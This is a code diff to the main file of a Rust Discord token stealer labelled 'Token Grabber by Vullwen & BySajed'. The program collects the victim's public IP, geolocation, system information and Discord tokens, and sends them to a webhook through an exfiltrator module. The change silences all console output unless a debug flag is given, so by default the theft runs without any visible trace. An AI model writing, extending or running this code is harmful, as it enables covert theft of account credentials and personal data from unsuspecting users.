@@ -5,36 +5,62 @@ mod utils;
 use exfiltrator::Exfiltrator;
 use extractor::Extractor;
 use utils::{get_geolocation, get_public_ip, get_system_info, get_timestamp};
+
+use clap::Parser;
 use serde_json::json;
+
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    #[arg(short, long)]
+    debug: bool,
+}
 
 #[tokio::main]
 async fn main() {
-    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-    println!("Token Grabber by Vullwen & BySajed");
-    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    let args = Args::parse();
+    let debug = args.debug;
 
-    println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-    println!("Recherche d'informations...");
-    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    if debug {
+        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+        println!("Token Grabber by Vullwen & BySajed");
+        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+
+        println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+        println!("Recherche d'informations...");
+        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    }
     let ip = match get_public_ip().await {
         Ok(Some(ip_str)) => {
-            println!("IP publique : {}", ip_str);
+            if debug {
+                println!("IP publique : {}", ip_str);
+            }
             ip_str
         }
         Ok(None) => {
-            eprintln!("Impossible de récupérer l'IP publique");
+            if debug {
+                eprintln!("Impossible de récupérer l'IP publique");
+            }
             return;
         }
         Err(e) => {
-            eprintln!("Erreur lors de la récupération de l'IP : {}", e);
+            if debug {
+                eprintln!("Erreur lors de la récupération de l'IP : {}", e);
+            }
             return;
         }
     };
-    println!("Géolocalisation de l’IP :");
+    if debug {
+        println!("Géolocalisation de l’IP :");
+    }
     if let Some((city, country)) = get_geolocation(&ip).await {
-        println!("IP {} → {}, {}", ip, city, country);
+        if debug {
+            println!("IP {} → {}, {}", ip, city, country);
+        }
     } else {
-        eprintln!("Impossible de géolocaliser l’IP {}", ip);
+        if debug {
+            eprintln!("Impossible de géolocaliser l’IP {}", ip);
+        }
     }
 
     //Init
@@ -43,13 +69,18 @@ async fn main() {
     let exfiltrator = Exfiltrator::new(webhook_url);
 
     let mut entries = Vec::new();
-
-    println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-    println!("Recherche de tokens...");
-    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-    let tokens = extractor.extract_discord_tokens();
+    if debug {
+        println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+        println!("Recherche de tokens...");
+        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    }
+    let tokens = extractor.extract_discord_tokens(debug);
     //supprimer les doublons
-    let tokens: Vec<String> = tokens.into_iter().collect::<std::collections::HashSet<_>>().into_iter().collect();
+    let tokens: Vec<String> = tokens
+        .into_iter()
+        .collect::<std::collections::HashSet<_>>()
+        .into_iter()
+        .collect();
     let sys_info = get_system_info();
     let ts = get_timestamp();
     let location = match get_geolocation(&ip).await {
@@ -67,25 +98,42 @@ async fn main() {
     });
     entries.push(data);
 
-    println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-    println!("Envoi...");
-    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
-    if let Err(err) = run_token_grabber(&exfiltrator, entries).await {
-        eprintln!("Erreur lors de l’exécution : {}", err);
-    } 
+    if debug {
+        println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+        println!("Envoi...");
+        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    }
+    if let Err(err) = run_token_grabber(&exfiltrator, entries, debug).await {
+        if debug {
+            eprintln!("Erreur lors de l’exécution : {}", err);
+        }
+    }
 }
 
 async fn run_token_grabber(
     exfiltrator: &Exfiltrator,
     entries: Vec<serde_json::Value>,
+    debug: bool,
 ) -> Result<(), String> {
     for entry in entries.into_iter() {
-        println!("Traitement de l’entrée au timestamp {}", entry["timestamp"]);
+        if debug {
+            println!("Traitement de l’entrée au timestamp {}", entry["timestamp"]);
+        }
 
         let data_struct: extractor::ExtractedData = serde_json::from_value(entry.clone())
             .map_err(|e| format!("Conversion JSON en ExtractedData : {}", e))?;
 
-        exfiltrator.send_data(&data_struct).await?;
+        match exfiltrator.send_data(&data_struct).await {
+            Ok(payload) => {
+                if debug {
+                    println!(
+                        "Payload renvoyé : {}",
+                        serde_json::to_string_pretty(&payload).unwrap()
+                    );
+                }
+            }
+            Err(err) => return Err(err),
+        }
     }
     Ok(())
 }
